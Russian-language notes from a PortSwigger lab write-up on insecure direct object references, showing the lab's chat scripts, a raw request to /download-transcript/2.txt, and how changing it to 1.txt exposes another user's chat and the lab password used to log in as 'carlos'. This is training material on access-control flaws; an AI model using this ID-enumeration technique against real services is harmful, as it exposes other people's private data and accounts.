Небезопасные прямые ссылки на объекты (IDOR)

лаба https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references

сервер хранит журналы чатов пользователей непосредственно в файловой системе сервера и извлекает их с помощью статических URL-адресов

задание: найти пароль от carlos

-----
нашел открытые пути
```
главная

/resources/images/rating2.png
/product?productId=19
/image/productcatalog/products/8.jpg

чат

/chat/viewTranscript('/download-transcript')
/resources/js/chat.js
/resources/js/viewTranscript.js

```

по путям в html лежат разного рода файлы

```js
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
Cache-Control: public, max-age=3600
X-Frame-Options: SAMEORIGIN
Content-Length: 1204

function viewTranscript(downloadTranscriptPath) {
    var chatForm = document.getElementById("chatForm");

    var viewTranscriptButton = document.createElement("button");
    viewTranscriptButton.setAttribute("id", "download-transcript");
    viewTranscriptButton.setAttribute("class", "button");
    viewTranscriptButton.innerText = "View transcript";
    viewTranscriptButton.onclick = viewTranscript;

    chatForm.appendChild(viewTranscriptButton)

    function viewTranscript() {
        var chatArea = document.getElementById("chat-area");
        var messages = chatArea.getElementsByClassName("message")
        var transcript = [];
        for (var i = 0; i < messages.length; i++)
        {
           var message = messages.item(i)
           transcript.push(message.getElementsByTagName("th").item(0).innerText + " " + message.getElementsByTagName("td").item(0).innerText)
        }

        var xhr = new XMLHttpRequest();
        xhr.onload = function() {
            window.location = xhr.responseURL;
        }
        xhr.open("POST", downloadTranscriptPath);
        data = new FormData();
        data.append("transcript", transcript.join("<br/>"));
        xhr.send(data);
    }
};


```

```js
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
Cache-Control: public, max-age=3600
X-Frame-Options: SAMEORIGIN
Content-Length: 3561

(function () {
    var chatForm = document.getElementById("chatForm");
    var messageBox = document.getElementById("message-box");
    var webSocket = openWebSocket();

    messageBox.addEventListener("keydown", function (e) {
        if (e.key === "Enter" && !e.shiftKey) {
            e.preventDefault();
            sendMessage(new FormData(chatForm));
            chatForm.reset();
        }
    });

    chatForm.addEventListener("submit", function (e) {
        e.preventDefault();
        sendMessage(new FormData(this));
        this.reset();
    });

    function writeMessage(className, user, content) {
        var row = document.createElement("tr");
        row.className = className

        var userCell = document.createElement("th");
        var contentCell = document.createElement("td");
        userCell.innerHTML = user;
        contentCell.innerHTML = (typeof window.renderChatMessage === "function") ? window.renderChatMessage(content) : content;

        row.appendChild(userCell);
        row.appendChild(contentCell);
        document.getElementById("chat-area").appendChild(row);
    }

    function sendMessage(data) {
        var object = {};
        data.forEach(function (value, key) {
            object[key] = htmlEncode(value);
        });

        openWebSocket().then(ws => ws.send(JSON.stringify(object)));
    }

    function htmlEncode(str) {
        if (chatForm.getAttribute("encode")) {
            return String(str).replace(/['"<>&\r\n\\]/gi, function (c) {
                var lookup = {'\\': '&#x5c;', '\r': '&#x0d;', '\n': '&#x0a;', '"': '&quot;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '&': '&amp;'};
                return lookup[c];
            });
        }
        return str;
    }

    function openWebSocket() {
       return new Promise(res => {
            if (webSocket) {
                res(webSocket);
                return;
            }

            let newWebSocket = new WebSocket(chatForm.getAttribute("action"));

            newWebSocket.onopen = function (evt) {
                writeMessage("system", "System:", "No chat history on record");
                newWebSocket.send("READY");
                res(newWebSocket);
            }

            newWebSocket.onmessage = function (evt) {
                var message = evt.data;

                if (message === "TYPING") {
                    writeMessage("typing", "", "[typing...]")
                } else {
                    var messageJson = JSON.parse(message);
                    if (messageJson && messageJson['user'] !== "CONNECTED") {
                        Array.from(document.getElementsByClassName("system")).forEach(function (element) {
                            element.parentNode.removeChild(element);
                        });
                    }
                    Array.from(document.getElementsByClassName("typing")).forEach(function (element) {
                        element.parentNode.removeChild(element);
                    });

                    if (messageJson['user'] && messageJson['content']) {
                        writeMessage("message", messageJson['user'] + ":", messageJson['content'])
                    } else if (messageJson['error']) {
                        writeMessage('message', "Error:", messageJson['error']);
                    }
                }
            };

            newWebSocket.onclose = function (evt) {
                webSocket = undefined;
                writeMessage("message", "System:", "--- Disconnected ---");
            };
        });
    }
})();


```
есть функция кодировки спец символов htmlEncode
но лаба не об этом, так бы , имея оргинал кода - можно подумать как обойти и сделать xss

в остальном - прямо для лабы внутри js не вижу ничего

НО ЕСТЬ ФАКТ ТОГО, ЧТО СИСТЕМА ПОЗВОЛЯЕТ МНЕ ПРОСМАТРИВАТЬ СИСТЕМНЫЕ ФАЙЛЫ..



-------

есть есть кнопка загрузки файлов
я смог скачать файл диалога в чате

```http
You: 1777<br/>

Hal Pline: Could you spell that please? I think you're making up words again<br/>

Hal Pline: Remember that power cut? Best time of my life<br/>

CONNECTED: -- Now chatting with Hal Pline --
```


вот запрос на скачавание файла

```http
GET /download-transcript/2.txt HTTP/2
Host: 0a84000d031221c781696b6f00f9009d.web-security-academy.net
Cookie: session=Y9ELnWBmPzTO6pglPvtEz2EqHRwuyiUv
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a84000d031221c781696b6f00f9009d.web-security-academy.net/chat
Accept-Encoding: gzip, deflate, br
Priority: u=1, i


```

пробую просто менять здесь пути
GET /download-transcript/2.txt HTTP/2

---

поменял   /download-transcript/1.txt
 
и получил чужую переписку..

```js

CONNECTED: -- Now chatting with Hal Pline --

You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one

Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.

You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****

Hal Pline: Takes one to know one

You: Ok so my password is hq0p1sywehdc8k4brt94. Is that right?

Hal Pline: Yes it is!
You: Ok thanks, bye!
Hal Pline: Do one!
```

получил конфид инфу из чата hq0p1sywehdc8k4brt94

использовал ее - украл ак карлоса

#### ⭐️лаба решена

ЭТО IDOR, но не с параметром в URL, а с прямым доступом к файлам на сервере - по прямым ссылкам

Система хранит логи чатов как простые текстовые файлы

Система не проверяет, принадлежит ли запрашиваемый файл тому пользователю, который его скачивает

Никакой проверки прав доступа к файлу на уровне приложения не было

Любой может поменять предсказуемый путь и получить чужие данные



